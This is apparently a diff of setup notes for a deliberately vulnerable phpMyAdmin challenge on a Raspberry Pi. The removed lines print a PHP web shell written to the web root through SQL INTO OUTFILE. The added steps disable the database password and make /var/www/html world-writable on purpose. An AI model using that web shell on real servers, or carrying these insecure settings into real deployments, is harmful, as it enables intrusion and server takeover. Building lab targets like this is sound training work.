@@ -1,24 +1,48 @@
-From http://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
+### Purpose
 
-1. Run 'sudo apt-get install apache2 mariadb-server-10.1 php phpmyadmin -y'
-2. Click yes twice during the installation - for defaults
-3. Run 'sudo nano /etc/apache2/apache2.conf'
-4. Add 'Include /etc/phpmyadmin/apache.conf' to the end of the file
-5. Run 'sudo service apache2 restart'
+To install and setup the software needed for the *phpmyadmin* challenge.
 
-The service should now be accesible from PI via localhost/phpmyadmin
-You can check default password in (provide path, I forgot), but this is not enough to make the exploit possible
-Due to access issues, somehow a phpmyadmin login has to provide sudo rights, to create a file in I presume /var/www/html
-Following command should work - SELECT "<?php system($_GET[‘cmd’]); ?>" INTO OUTFILE "/var/www/html/backdoor.php"
-After which it should possible to enter commands using cmd keyword in query, something like in Flask task
+### Instructions
 
-SELECT "<?php $output = shell_exec('ls'); echo \"<pre>$output</pre>\"; ?>" INTO OUTFILE "/var/www/html/backdoor.php"
+1. Run following command (agree to everything):
 
-root works with no password (unchecked password needed, might as well set the password as admin)
+'''
+sudo apt-get install apache2 mariadb-server-10.1 php -y
+'''
+
+2. Run following command (agree to everything), choose Apache2 and put no password for the database (click yes twice):
+
+'''
+sudo apt-get install phpmyadmin -y
+'''
+
+3. Run following command:
+
+'''
+sudo nano /etc/apache2/apache2.conf
+'''
+
+4. In the config file, at following line to the end of the file:
+
+'''
+Include /etc/phpmyadmin/apache.conf
+'''
+
+5. Run following command:
+
+'''
+sudo service apache2 restart
+'''
+
+The service should now be accesible from a webbrowser via localhost/phpmyadmin (or ip/phpmyadmin where ip is PI's ip).
+
+**TO BE CHECKED**
+
+Should be enough to make the challenge work
 
 sudo chmod  o+w /var/www/html should work
 sudo nano /etc/phpmyadmin/confg.inc.something all lines with AllowNoPassword to TRUE
 
-Notes:
+### Source
 
-XAMPP will not work on PI due to different hardware architectures.
+http://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
